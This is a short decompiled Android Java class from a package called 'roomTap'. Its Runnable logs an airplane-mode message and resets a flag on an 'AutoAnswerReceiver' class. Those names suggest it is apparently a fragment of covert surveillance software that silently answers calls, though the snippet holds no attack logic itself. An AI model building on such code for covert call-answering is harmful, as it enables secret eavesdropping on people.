package com.network.android.roomTap;

import com.network.android.c.a.a;

/* access modifiers changed from: package-private */
public final class f implements Runnable {
    f() {
    }

    public final void run() {
        a.a("disconnect setting airplane mode: false");
        AutoAnswerReceiver.a(AutoAnswerReceiver.v, false);
    }
}
